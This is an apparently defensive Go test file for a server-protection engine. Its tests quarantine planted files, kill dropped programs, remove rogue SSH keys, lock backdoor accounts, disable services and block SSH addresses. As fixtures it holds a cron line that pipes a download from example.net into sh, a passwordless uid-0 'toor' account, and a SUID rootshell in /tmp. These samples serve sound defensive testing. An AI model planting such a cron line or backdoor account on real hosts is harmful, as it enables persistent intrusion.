package protect

import (
	"context"
	"crypto/ed25519"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"syscall"
	"testing"

	"meridian/internal/agent/sshd"
	"meridian/internal/proto"
)

// host is a server's file system in a folder, with the programs the steps run stubbed.
type host struct {
	t      *testing.T
	root   string
	e      *Engine
	ran    []string
	killed []int
	sshd   sshd.Settings
}

func newHost(t *testing.T) *host {
	h := &host{t: t, root: t.TempDir(), sshd: sshd.Settings{"passwordauthentication": {"yes"}, "permitrootlogin": {"prohibit-password"},
		"pubkeyauthentication": {"yes"}, "port": {"22"}}}
	h.write("etc/passwd", "root:x:0:0:root:/root:/bin/bash\nalice:x:1000:1000::/home/alice:/bin/bash\n"+
		"backdoor:x:1001:1001::/home/backdoor:/bin/bash\ntoor:x:0:0::/root:/bin/sh\n", 0o644)
	h.write("etc/shadow", "root:$6$a$b:19000:0:99999:7:::\nalice:$6$c$d:19000:0:99999:7:::\nbackdoor:$6$e$f:19000:0:99999:7::20000:\n"+
		"toor::19000:0:99999:7:::\n", 0o600)
	h.e = &Engine{Root: h.root, Dir: filepath.Join(h.root, "var/lib/meridian-agent/protect"),
		Own:     func(p string) bool { return strings.HasPrefix(p, "/var/lib/meridian-agent/") },
		Trusted: func() []string { return []string{"203.0.113.9"} },
		Run: func(_ context.Context, name string, args ...string) (string, error) {
			h.ran = append(h.ran, strings.Join(append([]string{name}, args...), " "))
			if name == "systemctl" && len(args) > 0 && args[0] == "is-active" {
				return "active", nil
			}
			return "", nil
		},
		SSHD: func(context.Context) (sshd.Settings, error) {
			s := sshd.Settings{}
			for k, v := range h.sshd {
				s[k] = v
			}
			if _, err := os.Stat(filepath.Join(h.root, sshd.KeysOnlyFile)); err == nil { // the file written comes first
				s["passwordauthentication"], s["kbdinteractiveauthentication"] = []string{"no"}, []string{"no"}
			}
			return s, nil
		},
		Test:   func(context.Context) (string, error) { return "", nil },
		Reload: func(context.Context) error { h.ran = append(h.ran, "reload ssh"); return nil },
		Init:   func() string { return "systemd" },
		Kill:   func(pid int, _ syscall.Signal) error { h.killed = append(h.killed, pid); return nil },
	}
	return h
}

func (h *host) write(p, body string, mode os.FileMode) string {
	full := filepath.Join(h.root, p)
	if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
		h.t.Fatal(err)
	}
	if err := os.WriteFile(full, []byte(body), mode); err != nil {
		h.t.Fatal(err)
	}
	_ = os.Chmod(full, mode)
	return full
}

func (h *host) do(id int64, f proto.Fix) (string, error) {
	return h.e.Do(context.Background(), proto.Protect{ID: id, Fix: &f})
}

func (h *host) undo(id int64) (string, error) {
	return h.e.Do(context.Background(), proto.Protect{ID: id, Undo: true})
}

func sum(s string) string {
	x := sha256.Sum256([]byte(s))
	return hex.EncodeToString(x[:])
}

// sshKeyLine makes an authorized_keys line and its fingerprint.
func sshKeyLine(t *testing.T, comment string) (line, fp string) {
	pub, _, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	var blob []byte
	for _, part := range [][]byte{[]byte("ssh-ed25519"), pub} {
		blob = binary.BigEndian.AppendUint32(blob, uint32(len(part)))
		blob = append(blob, part...)
	}
	line = "ssh-ed25519 " + base64.StdEncoding.EncodeToString(blob) + " " + comment
	got, _, _, ok := sshd.KeyFingerprint(line)
	if !ok {
		t.Fatal("no fingerprint")
	}
	return line, got
}

// TestQuarantine: a planted file goes into quarantine - only the file the health check saw, only
// where malware plants itself - and comes back on undo with its mode, unless something else took
// its place.
func TestQuarantine(t *testing.T) {
	h := newHost(t)
	body := "* * * * * root curl -s https://example.net/x | sh\n"
	h.write("etc/cron.d/evil", body, 0o644)
	if _, err := h.do(1, proto.Fix{Kind: proto.FixQuarantine, Path: "/etc/cron.d/evil", SHA256: sum("something else")}); err == nil ||
		!strings.Contains(err.Error(), "changed since") {
		t.Errorf("a file that changed since: %v", err)
	}
	msg, err := h.do(2, proto.Fix{Kind: proto.FixQuarantine, Path: "/etc/cron.d/evil", SHA256: sum(body)})
	if err != nil || !strings.Contains(msg, "quarantine") {
		t.Fatalf("%q %v", msg, err)
	}
	if _, err := os.Stat(filepath.Join(h.root, "etc/cron.d/evil")); err == nil {
		t.Fatal("still there")
	}
	q := filepath.Join(h.e.Dir, "quarantine/2/file")
	if fi, err := os.Stat(q); err != nil || fi.Mode().Perm() != 0 {
		t.Fatalf("quarantined: %v %v", fi, err)
	}
	if msg, _ := h.do(2, proto.Fix{Kind: proto.FixQuarantine, Path: "/etc/cron.d/evil"}); msg != "done already" {
		t.Errorf("done twice: %q", msg)
	}
	if _, err := h.undo(2); err != nil {
		t.Fatal(err)
	}
	if fi, err := os.Stat(filepath.Join(h.root, "etc/cron.d/evil")); err != nil || fi.Mode().Perm() != 0o644 {
		t.Fatalf("restored: %v %v", fi, err)
	}
	// what it may never move
	for _, p := range []string{"/etc/passwd", "/etc/crontab", "/etc/sudoers", "/tmp/plain", "/etc/cron.d/../passwd", "relative"} {
		if p == "/tmp/plain" {
			h.write("tmp/plain", "x", 0o755)
		}
		if _, err := h.do(10, proto.Fix{Kind: proto.FixQuarantine, Path: p}); err == nil {
			t.Errorf("moved %s", p)
		}
	}
	// a program with administrator rights in /tmp may go
	h.write("tmp/.x/rootshell", "ELF", 0o755)
	_ = os.Chmod(filepath.Join(h.root, "tmp/.x/rootshell"), 0o755|os.ModeSetuid)
	if _, err := h.do(11, proto.Fix{Kind: proto.FixQuarantine, Path: "/tmp/.x/rootshell", SHA256: sum("ELF")}); err != nil {
		t.Errorf("SUID in /tmp: %v", err)
	}
	// undo refuses to overwrite what took the place
	h.write("tmp/.x/rootshell", "new", 0o644)
	if _, err := h.undo(11); err == nil || !strings.Contains(err.Error(), "something else") {
		t.Errorf("overwrote: %v", err)
	}
}

// TestStopProcess: the process the health check saw - the same start - is stopped, every process
// running the same dropped program too, and the program goes into quarantine; a reused pid is
// another process and is left alone; a program in a system folder stays.
func TestStopProcess(t *testing.T) {
	h := newHost(t)
	h.write("tmp/.x/miner", "ELF", 0o755)
	proc := func(pid int, start uint64, exe string) {
		h.write(fmt.Sprintf("proc/%d/stat", pid), fmt.Sprintf("%d (x) S 1 1 1 0 -1 0 0 0 0 0 1 1 0 0 20 0 1 0 %d 0 0", pid, start), 0o644)
		_ = os.Symlink(exe, filepath.Join(h.root, fmt.Sprintf("proc/%d/exe", pid)))
	}
	proc(4001, 777, "/tmp/.x/miner")
	proc(4002, 900, "/tmp/.x/miner") // its watchdog, the same program
	proc(4003, 901, "/usr/bin/python3")
	if _, err := h.do(1, proto.Fix{Kind: proto.FixStopProcess, PID: 4001, Start: 778, Path: "/usr/bin/python3"}); err == nil {
		t.Error("stopped a process that is not the one found")
	}
	msg, err := h.do(2, proto.Fix{Kind: proto.FixStopProcess, PID: 4001, Start: 777, Path: "/tmp/.x/miner"})
	if err != nil || !slices.Contains(h.killed, 4001) || !slices.Contains(h.killed, 4002) || slices.Contains(h.killed, 4003) {
		t.Fatalf("%q %v killed %v", msg, err, h.killed)
	}
	if _, err := os.Stat(filepath.Join(h.root, "tmp/.x/miner")); err == nil || !strings.Contains(msg, "quarantine") {
		t.Errorf("the program stayed: %q", msg)
	}
	h.killed = nil
	if _, err := h.do(3, proto.Fix{Kind: proto.FixStopProcess, PID: 4003, Start: 901, Path: "/usr/bin/python3"}); err != nil ||
		!slices.Contains(h.killed, 4003) {
		t.Errorf("a process posing as something else: %v %v", err, h.killed)
	}
	if _, err := os.Stat(filepath.Join(h.root, "usr/bin/python3")); err == nil {
		t.Error("a system program was touched")
	}
	if _, err := h.do(4, proto.Fix{Kind: proto.FixStopProcess, PID: 5000, Start: 1, Path: "/var/lib/meridian-agent/cores/xray/current/xray"}); err == nil {
		t.Error("stopped Rosélune's own program")
	}
	if _, err := h.undo(2); err != nil {
		t.Errorf("the program back from quarantine: %v", err)
	}
}

// TestRemoveKey: one key comes out of an authorized_keys file and back in on undo; the last key of
// root is kept where SSH takes no passwords; only authorized_keys files of the host's accounts.
func TestRemoveKey(t *testing.T) {
	h := newHost(t)
	mine, myFP := sshKeyLine(t, "me@laptop")
	evil, evilFP := sshKeyLine(t, "x@y")
	h.write("root/.ssh/authorized_keys", mine+"\n"+evil+"\n", 0o600)
	msg, err := h.do(1, proto.Fix{Kind: proto.FixRemoveKey, Path: "/root/.ssh/authorized_keys", Key: evilFP})
	if err != nil || !strings.Contains(msg, "root") {
		t.Fatalf("%q %v", msg, err)
	}
	b, _ := os.ReadFile(filepath.Join(h.root, "root/.ssh/authorized_keys"))
	if string(b) != mine+"\n" {
		t.Fatalf("left: %q", b)
	}
	if fi, _ := os.Stat(filepath.Join(h.root, "root/.ssh/authorized_keys")); fi.Mode().Perm() != 0o600 {
		t.Errorf("mode %v", fi.Mode())
	}
	h.sshd["passwordauthentication"] = []string{"no"}
	if _, err := h.do(2, proto.Fix{Kind: proto.FixRemoveKey, Path: "/root/.ssh/authorized_keys", Key: myFP}); err == nil ||
		!strings.Contains(err.Error(), "last key") {
		t.Errorf("the last way in: %v", err)
	}
	if _, err := h.undo(1); err != nil {
		t.Fatal(err)
	}
	b, _ = os.ReadFile(filepath.Join(h.root, "root/.ssh/authorized_keys"))
	if !strings.Contains(string(b), evil) {
		t.Errorf("not back: %q", b)
	}
	for _, p := range []string{"/etc/passwd", "/root/.ssh/../.ssh/authorized_keys", "/home/nobody/.ssh/authorized_keys", "/root/.ssh/id_ed25519"} {
		if _, err := h.do(3, proto.Fix{Kind: proto.FixRemoveKey, Path: p, Key: evilFP}); err == nil {
			t.Errorf("touched %s", p)
		}
	}
}

// TestLockAccount: an account is locked and expired, its processes end (not a uid 0 account's: they
// cannot be told from root's), root is refused, and undo gives back what it had.
func TestLockAccount(t *testing.T) {
	h := newHost(t)
	h.write("proc/7001/status", "Name:\tsh\nUid:\t1001\t1001\t1001\t1001\n", 0o644)
	h.write("proc/7002/status", "Name:\tsh\nUid:\t0\t0\t0\t0\n", 0o644)
	if _, err := h.do(1, proto.Fix{Kind: proto.FixLockAccount, User: "root"}); err == nil {
		t.Error("locked root")
	}
	msg, err := h.do(2, proto.Fix{Kind: proto.FixLockAccount, User: "backdoor"})
	if err != nil || !slices.Contains(h.ran, "usermod -L -e 1 backdoor") || !slices.Equal(h.killed, []int{7001}) {
		t.Fatalf("%q %v ran %v killed %v", msg, err, h.ran, h.killed)
	}
	h.killed = nil
	if _, err := h.do(3, proto.Fix{Kind: proto.FixLockAccount, User: "toor"}); err != nil || len(h.killed) != 0 {
		t.Errorf("a second uid 0 account: %v, killed %v", err, h.killed)
	}
	h.ran = nil
	if _, err := h.undo(2); err != nil || !slices.Contains(h.ran, "usermod -e 2024-10-04 backdoor") || !slices.Contains(h.ran, "usermod -U backdoor") {
		t.Errorf("unlock: %v %v", err, h.ran)
	}
}

// TestDisableService: a service is stopped and kept from starting; the system's own and Rosélune's
// are refused; undo starts it again.
func TestDisableService(t *testing.T) {
	h := newHost(t)
	for _, u := range []string{"ssh.service", "systemd-resolved.service", "meridian-xray.service", "evil", "../x.service", "a b.service"} {
		if _, err := h.do(1, proto.Fix{Kind: proto.FixDisableService, Unit: u}); err == nil {
			t.Errorf("turned off %s", u)
		}
	}
	if _, err := h.do(2, proto.Fix{Kind: proto.FixDisableService, Unit: "evil.service"}); err != nil || !slices.Contains(h.ran, "systemctl disable --now evil.service") {
		t.Fatalf("%v %v", err, h.ran)
	}
	h.ran = nil
	if _, err := h.undo(2); err != nil || !slices.Equal(h.ran, []string{"systemctl enable evil.service", "systemctl start evil.service"}) {
		t.Errorf("%v %v", err, h.ran)
	}
}

// TestKeysOnly: SSH takes keys only - written to its own settings file, checked and reloaded - but
// only where the settings read that folder and an account can sign in with a key; undo removes it.
func TestKeysOnly(t *testing.T) {
	h := newHost(t)
	h.write("etc/ssh/sshd_config", "Include /etc/ssh/sshd_config.d/*.conf\nPasswordAuthentication yes\n", 0o644)
	if _, err := h.do(1, proto.Fix{Kind: proto.FixKeysOnly}); err == nil || !strings.Contains(err.Error(), "add your key") {
		t.Errorf("no key anywhere: %v", err)
	}
	mine, _ := sshKeyLine(t, "me@laptop")
	h.write("root/.ssh/authorized_keys", mine+"\n", 0o600)
	msg, err := h.do(2, proto.Fix{Kind: proto.FixKeysOnly})
	if err != nil || !slices.Contains(h.ran, "reload ssh") {
		t.Fatalf("%q %v %v", msg, err, h.ran)
	}
	b, _ := os.ReadFile(filepath.Join(h.root, sshd.KeysOnlyFile))
	if !strings.Contains(string(b), "PasswordAuthentication no") || !strings.Contains(string(b), "PermitEmptyPasswords no") {
		t.Errorf("settings: %s", b)
	}
	if _, err := h.undo(2); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(filepath.Join(h.root, sshd.KeysOnlyFile)); err == nil {
		t.Error("still keys only")
	}
	h.write("etc/ssh/sshd_config", "PasswordAuthentication yes\n", 0o644) // no Include
	if _, err := h.do(3, proto.Fix{Kind: proto.FixKeysOnly}); err == nil || !strings.Contains(err.Error(), "by hand") {
		t.Errorf("settings that do not read the folder: %v", err)
	}
}

// TestBlockSSH: public addresses only, never one that signed in lately; undo lets them back.
func TestBlockSSH(t *testing.T) {
	h := newHost(t)
	msg, err := h.do(1, proto.Fix{Kind: proto.FixBlockSSH, Addrs: []string{"198.51.100.7", "10.0.0.5", "203.0.113.9", "::ffff:198.51.100.8",
		"2001:db8::1", "fe80::1", "nonsense"}})
	if err != nil || !strings.Contains(msg, "3 addresses can no longer") || !strings.Contains(msg, "4 addresses left out") {
		t.Fatalf("%q %v", msg, err)
	}
	if got := h.e.Blocked(); !slices.Equal(got, []string{"198.51.100.7", "198.51.100.8", "2001:db8::1"}) {
		t.Errorf("blocked %v", got)
	}
	if _, err := h.undo(1); err != nil || len(h.e.Blocked()) != 0 {
		t.Errorf("unblock: %v %v", err, h.e.Blocked())
	}
	if _, err := h.do(2, proto.Fix{Kind: proto.FixBlockSSH, Addrs: []string{"192.168.1.2"}}); err == nil {
		t.Error("blocked a private address")
	}
}
